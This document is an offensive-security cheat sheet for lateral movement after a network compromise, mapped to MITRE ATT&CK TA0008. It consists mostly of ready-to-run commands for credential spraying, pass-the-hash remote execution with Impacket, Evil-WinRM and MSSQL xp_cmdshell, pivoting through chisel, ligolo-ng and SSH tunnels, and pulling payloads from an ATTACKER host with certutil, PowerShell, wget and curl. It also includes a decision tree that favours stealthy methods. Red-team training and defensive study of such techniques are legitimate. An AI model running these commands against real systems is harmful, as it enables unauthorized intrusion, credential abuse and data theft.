# Lateral Movement — Deep Dive (TA0008)

> Complete methodology for moving through a network after initial compromise.
> Maps to MITRE ATT&CK TA0008 — Lateral Movement.

---

## Phase 1: Internal Reconnaissance (Before Moving)

```bash
# Identify live hosts
nmap -sn SUBNET/24 --min-rate 1000
crackmapexec smb SUBNET/24

# Identify what services are available
nmap -sV -p 22,80,135,139,443,445,1433,3306,3389,5432,5985,5986,8080 SUBNET/24

# Check which hosts your creds work on
crackmapexec smb SUBNET/24 -u user -p pass
crackmapexec smb SUBNET/24 -u user -H NTLM_HASH
crackmapexec winrm SUBNET/24 -u user -p pass
crackmapexec ssh SUBNET/24 -u user -p pass
crackmapexec mssql SUBNET/24 -u user -p pass
```

## Phase 2: Remote Execution Methods

### Method Comparison
| Method | Port | Leaves Logs | Disk Touch | Admin Required |
|--------|------|-------------|------------|----------------|
| PSExec | 445 | High | Yes (service binary) | Yes |
| WMIExec | 135 | Medium | No | Yes |
| SMBExec | 445 | Medium | Yes (temp file) | Yes |
| ATExec | 445 | Low | No | Yes |
| DCOMExec | 135 | Low | No | Yes |
| WinRM | 5985/5986 | Medium | No | Yes* |
| SSH | 22 | Medium | No | No (if you have creds) |
| RDP | 3389 | High | No | No (RDP Users group) |

### PSExec (Reliable, Noisy)
```bash
# Impacket
impacket-psexec DOMAIN/user:pass@TARGET
impacket-psexec -hashes :NTLM_HASH DOMAIN/user@TARGET

# Metasploit
use exploit/windows/smb/psexec
set SMBUSER user
set SMBPASS pass  # or set SMBPass aad3b435...:NTLM_HASH
set RHOSTS TARGET
run
```

### WMIExec (Stealthier)
```bash
impacket-wmiexec DOMAIN/user:pass@TARGET
impacket-wmiexec -hashes :NTLM_HASH DOMAIN/user@TARGET

# Execute specific command
impacket-wmiexec DOMAIN/user:pass@TARGET "whoami /all"
```

### Evil-WinRM (Best for Interactive)
```bash
evil-winrm -i TARGET -u user -p pass
evil-winrm -i TARGET -u user -H NTLM_HASH

# Upload/download files
*Evil-WinRM* PS> upload /path/to/local/file C:\destination\file
*Evil-WinRM* PS> download C:\path\to\remote\file /local/path
*Evil-WinRM* PS> menu  # Show all commands
```

### SMBExec (Medium Noise)
```bash
impacket-smbexec DOMAIN/user:pass@TARGET
impacket-smbexec -hashes :NTLM_HASH DOMAIN/user@TARGET
```

### ATExec (Scheduled Task)
```bash
impacket-atexec DOMAIN/user:pass@TARGET "whoami > C:\temp\out.txt"
```

### DCOMExec (Stealthy)
```bash
impacket-dcomexec DOMAIN/user:pass@TARGET
impacket-dcomexec -hashes :NTLM_HASH DOMAIN/user@TARGET
```

### SSH
```bash
ssh user@TARGET
ssh -i private_key user@TARGET
sshpass -p 'password' ssh user@TARGET

# SSH with proxychains (through pivot)
proxychains4 ssh user@INTERNAL_TARGET
```

### RDP
```bash
xfreerdp /v:TARGET /u:DOMAIN\\user /p:pass /cert-ignore /dynamic-resolution
xfreerdp /v:TARGET /u:user /pth:NTLM_HASH /cert-ignore  # Pass the Hash RDP (restricted admin)
rdesktop TARGET -u user -p pass -d DOMAIN
```

### MSSQL
```bash
# SQL Server lateral movement
impacket-mssqlclient DOMAIN/user:pass@TARGET
# Enable xp_cmdshell:
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

# Linked servers → pivot to other SQL servers
SQL> EXEC sp_linkedservers
SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]
```

## Phase 3: Tunneling & Pivoting

### SSH Tunneling
```bash
# Local port forward (access internal service through pivot)
ssh -L 8080:INTERNAL_TARGET:80 user@PIVOT
# Now http://localhost:8080 hits INTERNAL_TARGET:80

# Dynamic SOCKS proxy
ssh -D 9050 user@PIVOT
# Configure proxychains: socks5 127.0.0.1 9050
proxychains4 nmap -sT INTERNAL_SUBNET/24

# Remote port forward (let internal host reach your attacker)
ssh -R 4444:localhost:4444 user@PIVOT
# Now PIVOT:4444 forwards to your attacker:4444
```

### Chisel (Modern, No SSH Needed)
```bash
# On attacker:
chisel server -p 8080 --reverse

# On target (SOCKS proxy):
chisel client ATTACKER:8080 R:socks
# Configure proxychains: socks5 127.0.0.1 1080

# Port forward:
chisel client ATTACKER:8080 R:LOCAL_PORT:INTERNAL_TARGET:REMOTE_PORT
```

### Ligolo-ng (VPN-like Pivoting)
```bash
# On attacker:
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# On target:
ligolo-agent -connect ATTACKER:11601 -retry -ignore-cert

# In ligolo-proxy:
> session
> start
> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444  # Reverse shell relay

# Add route on attacker:
sudo ip route add INTERNAL_SUBNET/24 dev ligolo
# Now you can directly access internal hosts!
```

### Metasploit Pivoting
```bash
# Auto-route through Meterpreter session
meterpreter> run autoroute -s INTERNAL_SUBNET/24
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> run -j
# Configure proxychains with socks5 127.0.0.1 1080

# Port forward
meterpreter> portfwd add -l LOCAL_PORT -p REMOTE_PORT -r INTERNAL_TARGET
```

## Phase 4: File Transfers During Lateral Movement

```bash
# Serve files from attacker
python3 -m http.server 8080
impacket-smbserver share /path -smb2support -username user -password pass

# Download on Windows target
certutil -urlcache -f http://ATTACKER:8080/file C:\temp\file
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8080/file','C:\temp\file')"
powershell -c "iwr http://ATTACKER:8080/file -OutFile C:\temp\file"
bitsadmin /transfer job http://ATTACKER:8080/file C:\temp\file

# Via SMB
copy \\ATTACKER\share\file C:\temp\file
net use Z: \\ATTACKER\share /user:user pass

# Download on Linux target
wget http://ATTACKER:8080/file -O /tmp/file
curl http://ATTACKER:8080/file -o /tmp/file
scp user@ATTACKER:/path/file /tmp/file
```

## Decision Tree

```
Have creds + port 445 open   → Try WMIExec (stealthy) → PSExec (reliable)
Have creds + port 5985 open  → Evil-WinRM (interactive, great for post-ex)
Have creds + port 22 open    → SSH (Linux targets)
Have creds + port 3389 open  → RDP (need GUI / can't get shell otherwise)
Have creds + port 1433 open  → MSSQL → xp_cmdshell → RCE

Need to reach internal net   → SSH tunnel (if SSH) → Chisel → Ligolo-ng
Need SOCKS proxy             → ssh -D / chisel R:socks / ligolo
Need to relay a reverse shell → ligolo listener_add / ssh -R
```
